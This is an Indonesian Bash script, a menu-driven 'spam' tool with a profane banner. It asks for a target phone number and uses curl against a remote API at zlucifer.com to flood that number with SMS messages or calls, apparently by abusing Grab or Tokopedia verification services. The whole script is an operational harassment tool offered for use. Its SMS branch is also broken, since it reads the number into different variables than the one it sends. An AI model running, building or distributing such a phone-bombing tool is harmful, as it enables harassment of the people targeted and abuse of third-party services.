

troll(){
clear
}
load(){
    echo -e "\n"
    bar=" >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> "
    barlength=${#bar}
    i=0
    while((i<100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.2
    done
}
get_sms=$(curl -s http://zlucifer.com/api/hackbae.php?request=sms)
get_call=$(curl -s http://zlucifer.com/api/hackbae.php?request=call)
mulai (){
    echo "Gunakan Tools Lagi?"
    echo "y/n?"
    echo
    read -p "ketik di sini :" lagi
    if [ $lagi = "y" ]; then
            spam
    else
            echo "Terimakasih sudah pake tools Aink anjing!"
    fi
}
#spam
spam(){
    clear
    troll
    echo "\033[1;97m█████████
\033[1;97m█▄█████▄█      \033[1;96m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●
\033[1;97m█\033[1;91m▼▼▼▼▼ \033[1;97m- _ --_--\033[1;92m  ▄▀▀ █▀▄ ▄▀▄ █▄─▄█
\033[1;97m█ \033[1;97m \033[1;97m_-_-- -_ --__\033[1;92m  ─▀▄ █─█ █▀█ █─█─█
\033[1;97m█\033[1;91m▲▲▲▲▲\033[1;97m--  - _ --\033[1;92m  ▀▀─ █▀─ ▀─▀ ▀───▀ \033[1;93mv1.0
\033[1;97m█████████      \033[1;96m«----------✧----------»
\033[1;97m ██ ██
\033[1;97m╔═══════════════════════════════════════════╗​
\033[1;97m║ \033[1;93m* \033[1;97mAuthor \033[1;91m: \033[1;96KUYA PINTAR             \033[1;97m║
\033[1;97m║ \033[1;93m* \033[1;97mSuport \033[1;91m: \033[1;96KUY-149                        \033[1;97m║
\033[1;97m║ \033[1;93m* \033[1;97mGitHub \033[1;91m: \033[1;92mhttps://github.com/kuy149/033[1;97m║
\033[1;97m​​╚═══════════════════════════════════════════╝
\033[1;97m║---≫ 1.Spam SMS
\033[1;97m║---≫ 2.Spam Call
\033[1;97m║---≫ 3.Keluar!
\033[1;97m║"
read -p "╚══════D Pilih bangsat :" pilih
    if [ $pilih = "1" ]; then
            #function spam
            sleep 2
            echo "Masukan nomor telp target jorok modol!"
            echo contoh 08123xxxxxxx
            echo
            read -p "Ketik nomor disini cok! :" masukin no telp
            echo "
================================================="
            echo "Hanya dapat spam 1-10 sms aja bangsat!"
            read -p "ketik jumlah :" paket
            echo "
================================================="
            echo Apakah nomor $target "dan SMS dikirim "$paket" sudah benar?"
            echo y/n?
            read confirm
            echo
            if [ $confirm = "y" ]; then
                    load
                    clear
                    echo
                    echo Melakukan spam SMS ke nomor $target
                    echo "
================================================="
                    echo "Jangan close aplikasi sebelum spam selesai"
                    echo "
================================================="
                    target_do=$get_sms'/sms.php?nomor='$target'&paket='$paket
                    CURL_RESPONSE=`curl -s -o /dev/null -w "%{http_code}" $target_do`
                    echo " Gunakan tools dengan bijak ya njir!"
                    echo "
================================================="
            else
                    echo "Kesalahan"
            fi
        mulai
    elif [ $pilih = "2" ]; then
            echo "Spam Call"
            #function spam
            echo
            echo "Masukan nomor telp target bangsat!"
            echo contoh 08123xxxxxxx
            read target # masukin no telp
            echo
            echo "Gunakan API Grab/Toped?"
            echo "[1] GRAB"
            echo "[2] TOPED"
            echo "1/2?"
            read api
            if [ $api = "1" ]; then
                  api_spam="grab"
            else
                  api_spam="toped"
            fi
            echo Apakah nomor $target dan spam menggunakan $api_spam "sudah benar?"
            echo y/n?
            read confirm
            echo
            if [ $confirm = "y" ]; then
                  load
                  clear
                  echo Melakukan spam call ke nomor $target
                  echo
                  echo "Jangan close aplikasi sebelum spam selesai"
                  echo "========================================"
                  cek_target=`curl -s $get_call/call.php?nomor=$target"&method="$api_spam`
                  echo -e $cek_target
                  echo " Gunakan tools dengan bijak!"
                  echo "========================================"
            else
                  echo Kesalahan, silahkan coba lagi
            fi
        mulai
    elif [ $pilih = "3" ]; then
        echo "Terimakasih sudah memakai tools Aink!"
        close
    else
        clear
        echo "Kesalahan"
        mulai
    fi
    }
close(){
    exit
}
clear
echo "Loading.."
load
clear
echo
echo "Mulai tools spam?"
echo "y/t?"
read mulai
if [ $mulai = "y" ]; then
      spam
else
      close
fi

    

